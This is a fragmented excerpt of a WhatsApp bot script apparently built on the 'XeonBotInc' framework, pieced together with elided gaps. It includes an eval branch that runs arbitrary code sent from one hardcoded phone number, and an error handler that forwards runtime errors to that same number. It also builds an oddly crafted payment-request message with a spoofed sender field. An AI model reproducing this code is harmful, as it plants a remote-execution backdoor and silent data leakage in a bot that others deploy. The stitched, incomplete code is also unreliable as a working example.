...
var xeonytimewisher = `Good Morning 🌄`
		...
		if (isEval && senderNumber == "6283165737014") {
			let evaled,
				text = q,
...
if (!q) return replygcxeon(`Example ${prefix+command} 6283165737014`)
XeonStickWait()
...
case 'addprem':
if (!XeonTheCreator) return XeonStickOwner()
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 6283165737014`)
...
let teks = `${text}`
{
XeonBotInc.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${xeonorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `🦄`,"body": ` ${xeonytimewisher} my friend ${pushname}`,
...
let e = String(err)
XeonBotInc.sendMessage("6283165737014@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
